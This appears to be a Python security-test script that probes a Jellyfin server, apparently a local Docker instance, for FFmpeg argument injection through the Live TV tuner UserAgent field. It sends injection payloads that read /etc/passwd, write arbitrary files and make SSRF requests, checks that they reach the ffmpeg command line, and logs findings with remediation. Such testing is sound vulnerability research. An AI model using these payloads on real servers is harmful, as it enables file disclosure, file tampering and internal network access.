#!/usr/bin/env python3
"""
COBALT STRIKE II -- Phase 2d: Live TV Tuner User-Agent Injection
Dynamic test of FFmpeg argument injection via tuner host UserAgent.
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/JellyFin/scripts')

from jellyfin_common import *
import subprocess
import time

banner("Phase 2d: Live TV Tuner User-Agent Injection")

ec = EvidenceCollector("phase2d_tuner_injection", phase="phase2")
js = JellyfinSession()

if not js.test_connection():
    print("[-] Cannot connect to Jellyfin")
    sys.exit(1)

M3U_URL = "http://[REDACTED-INTERNAL-IP]:9999/test_iptv.m3u"

created_tuners = []


# ===========================================================================
# TEST 1: Normal user agent baseline
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 1: Normal User-Agent Baseline")
print("=" * 60)

data = {
    "Url": M3U_URL,
    "Type": "M3U",
    "FriendlyName": "Normal Test",
    "UserAgent": "Mozilla/5.0 Normal",
}
resp = js.post("/LiveTv/TunerHosts", data=data)
print(f"\n  POST /LiveTv/TunerHosts (normal UA): HTTP {resp.status_code}")

if resp.status_code == 200:
    info = resp.json()
    tuner_id = info.get("Id", "")
    created_tuners.append(tuner_id)
    print(f"  Tuner ID: {tuner_id}")
    print(f"  Stored UA: {info.get('UserAgent', '?')}")

    ec.add_test("TUNER-NORMAL", "Tuner host normal UA",
               f"POST /LiveTv/TunerHosts UserAgent=Mozilla/5.0 Normal",
               f"HTTP {resp.status_code}: tuner created", result="PASS")

    # Delete immediately
    del_resp = js.delete(f"/LiveTv/TunerHosts?id={tuner_id}")
    print(f"  Cleanup: HTTP {del_resp.status_code}")
    created_tuners.remove(tuner_id)
else:
    print(f"  Error: {resp.text[:200]}")
    ec.add_test("TUNER-NORMAL", "Tuner host normal UA",
               f"POST /LiveTv/TunerHosts", f"HTTP {resp.status_code}: {resp.text[:200]}",
               result="ERROR")

rate_limit(0.5)


# ===========================================================================
# TEST 2: Injection user agents
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 2: Injection User-Agent Payloads")
print("=" * 60)

injection_payloads = [
    {
        "name": "quote_break",
        "ua": 'Mozilla" -f null /dev/null -i "',
        "desc": "Quote break + null output + extra input",
    },
    {
        "name": "file_read_passwd",
        "ua": 'Mozilla" -i /etc/passwd -f rawvideo -pix_fmt rgb24 /tmp/proof.raw -y -i "',
        "desc": "Read /etc/passwd via -i flag",
    },
    {
        "name": "ssrf",
        "ua": 'Mozilla" -i http://[REDACTED-INTERNAL-IP]:8096/System/Info -f null /dev/null -y -i "',
        "desc": "SSRF to Docker host",
    },
    {
        "name": "file_write",
        "ua": 'Mozilla" -y -f mp4 /tmp/pwned.mp4 -i "',
        "desc": "Write arbitrary file",
    },
]

for payload in injection_payloads:
    data = {
        "Url": M3U_URL,
        "Type": "M3U",
        "FriendlyName": f"Inject-{payload['name']}",
        "UserAgent": payload["ua"],
    }

    resp = js.post("/LiveTv/TunerHosts", data=data)
    status = resp.status_code

    if status == 200:
        info = resp.json()
        tuner_id = info.get("Id", "")
        stored_ua = info.get("UserAgent", "")
        created_tuners.append(tuner_id)

        print(f"\n  [!!] ACCEPTED: {payload['name']}")
        print(f"       Tuner ID: {tuner_id}")
        print(f"       Stored UA: {stored_ua[:100]}")

        # Check for unmodified storage
        has_quotes = '"' in stored_ua
        has_flags = "-f " in stored_ua or "-i " in stored_ua or "-y " in stored_ua
        if has_quotes or has_flags:
            print(f"       [!!] INJECTION PAYLOAD STORED UNMODIFIED (quotes={has_quotes}, flags={has_flags})")

        ec.add_test(
            f"TUNER-INJECT-{payload['name']}",
            f"Tuner UA injection: {payload['desc'][:40]}",
            f"POST /LiveTv/TunerHosts UserAgent={payload['ua'][:60]}",
            f"HTTP {status}: stored UA={stored_ua[:100]}",
            result="ANOMALOUS",
        )
    else:
        print(f"\n  [  ] REJECTED: {payload['name']}: HTTP {status}")
        ec.add_test(
            f"TUNER-INJECT-{payload['name']}",
            f"Tuner UA injection: {payload['desc'][:40]}",
            f"POST /LiveTv/TunerHosts UserAgent={payload['ua'][:60]}",
            f"HTTP {status}: {resp.text[:100]}",
            result="PASS",
        )

    rate_limit(0.5)


# ===========================================================================
# TEST 3: Verify stored configuration
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 3: Verify Stored Configuration")
print("=" * 60)

resp = js.get("/System/Configuration/livetv")
if resp.status_code == 200:
    config = resp.json()
    tuner_hosts = config.get("TunerHosts", [])
    print(f"\n  Found {len(tuner_hosts)} tuner host(s):\n")

    for th in tuner_hosts:
        name = th.get("FriendlyName", "?")
        ua = th.get("UserAgent", "")
        url = th.get("Url", "?")

        print(f"  Name: {name}")
        print(f"  URL: {url}")
        print(f"  UserAgent: {ua}")

        if '"' in ua or "-i " in ua or "-f " in ua:
            print(f"  [!!] MALICIOUS PAYLOAD CONFIRMED IN STORED CONFIG")
            ec.add_finding(
                f"FFMPEG-UA-STORED-{name[:15]}",
                "HIGH",
                f"FFmpeg argument injection stored in tuner config: {name}",
                f"TunerHostInfo.UserAgent accepts and stores arbitrary values "
                f"including FFmpeg command arguments without sanitization. "
                f"Stored value: {ua}. This value flows through "
                f"M3UTunerHost.cs -> RequiredHttpHeaders -> "
                f"EncodingHelper.GetUserAgentParam() -> FFmpeg command line "
                f"via direct string concatenation with no escaping.",
                evidence=json.dumps(th, indent=2)[:1000],
                remediation=(
                    "Sanitize UserAgent in TunerHostInfo.UserAgent setter or "
                    "in M3UTunerHost before assigning to RequiredHttpHeaders. "
                    "Strip double quotes and validate against FFmpeg arg patterns."
                ),
            )
        print()


# ===========================================================================
# TEST 4: Attempt to trigger transcoding with injected UA
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 4: Trigger Transcoding via Injected Tuner")
print("=" * 60)

# List available channels (these come from the M3U tuner we created)
channels_resp = js.get("/LiveTv/Channels")
if channels_resp.status_code == 200:
    channels = channels_resp.json().get("Items", [])
    print(f"\n  Found {len(channels)} Live TV channel(s)")

    for ch in channels[:5]:
        ch_id = ch.get("Id", "?")
        ch_name = ch.get("Name", "?")
        ch_type = ch.get("ChannelType", "?")
        print(f"\n  Channel: {ch_name} ({ch_type}) - ID: {ch_id}")

        # Get PlaybackInfo to see what transcoding URL and headers are set
        pi_body = {
            "DeviceProfile": {
                "TranscodingProfiles": [{
                    "Container": "ts",
                    "Type": "Video",
                    "VideoCodec": "h264",
                    "AudioCodec": "aac",
                    "Context": "Streaming",
                    "Protocol": "hls",
                }],
                "DirectPlayProfiles": [{
                    "Container": "mp4",
                    "Type": "Video",
                    "VideoCodec": "h264",
                    "AudioCodec": "aac",
                }],
            }
        }

        pi_resp = js.post(f"/Items/{ch_id}/PlaybackInfo", data=pi_body)
        print(f"  PlaybackInfo: HTTP {pi_resp.status_code}")

        if pi_resp.status_code == 200:
            pi_data = pi_resp.json()
            for ms in pi_data.get("MediaSources", []):
                tc_url = ms.get("TranscodingUrl", "")
                rh = ms.get("RequiredHttpHeaders", {})
                protocol = ms.get("Protocol", "?")
                is_remote = ms.get("IsRemote", False)

                print(f"    Protocol: {protocol}, IsRemote: {is_remote}")
                print(f"    RequiredHttpHeaders: {rh}")

                if rh:
                    ua_in_headers = rh.get("User-Agent", "")
                    if '"' in ua_in_headers or "-i " in ua_in_headers:
                        print(f"    [!!] INJECTION PAYLOAD IN RequiredHttpHeaders!")
                        print(f"    [!!] This WILL be passed to FFmpeg command line")
                        ec.add_finding(
                            "FFMPEG-UA-IN-HEADERS",
                            "HIGH",
                            "Injection payload present in RequiredHttpHeaders",
                            f"PlaybackInfo for channel {ch_name} returns "
                            f"RequiredHttpHeaders with injection payload: {ua_in_headers}. "
                            f"This confirms the payload reaches the FFmpeg command construction.",
                            evidence=f"RequiredHttpHeaders: {json.dumps(rh)}",
                        )

                if tc_url:
                    print(f"    TranscodingUrl: {tc_url[:150]}")

        # Try to actually stream the channel
        print(f"  Requesting HLS stream...")
        try:
            stream_resp = js.get(
                f"/Videos/{ch_id}/master.m3u8",
                params={
                    "MediaSourceId": ch_id,
                    "VideoCodec": "h264",
                    "AudioCodec": "aac",
                    "SegmentContainer": "ts",
                },
            )
            print(f"  HLS: HTTP {stream_resp.status_code}")
            if stream_resp.status_code == 200:
                print(f"    Content: {stream_resp.text[:200]}")

                # Wait and check FFmpeg
                rate_limit(3)
                result = subprocess.run(
                    ["docker", "exec", "cobalt-jellyfin", "bash", "-c",
                     "for pid in $(pgrep -f ffmpeg); do "
                     "echo '=== PID '$pid; "
                     "cat /proc/$pid/cmdline 2>/dev/null | tr '\\0' ' '; "
                     "echo; done"],
                    capture_output=True, text=True, timeout=10,
                )
                if result.stdout.strip():
                    print(f"    FFmpeg processes found:")
                    for line in result.stdout.strip().split("\n"):
                        print(f"      {line[:200]}")
                        if "-user_agent" in line:
                            print(f"      [!!] user_agent arg found in command line!")
                            # Extract the user_agent value
                            idx = line.find("-user_agent")
                            if idx >= 0:
                                ua_section = line[idx:idx+200]
                                print(f"      UA section: {ua_section[:150]}")
                else:
                    print(f"    No FFmpeg process (may have ended)")
        except Exception as e:
            print(f"  Stream error: {e}")

        rate_limit(1)
else:
    print(f"  Channels request: HTTP {channels_resp.status_code}")


# ===========================================================================
# CLEANUP
# ===========================================================================

print("\n" + "=" * 60)
print("  CLEANUP")
print("=" * 60)

# Delete all created tuners
for tid in created_tuners:
    resp = js.delete(f"/LiveTv/TunerHosts?id={tid}")
    print(f"  Deleted tuner {tid}: HTTP {resp.status_code}")

# Kill HTTP server
import subprocess
try:
    with open("/tmp/http_server_pid.txt") as f:
        pid = f.read().strip()
    subprocess.run(["kill", pid], capture_output=True, timeout=5)
    print(f"  Killed HTTP server (PID {pid})")
except:
    pass


# ===========================================================================
# SUMMARY
# ===========================================================================

print("\n" + "=" * 60)
print("  PHASE 2d SUMMARY")
print("=" * 60)

ec.save()
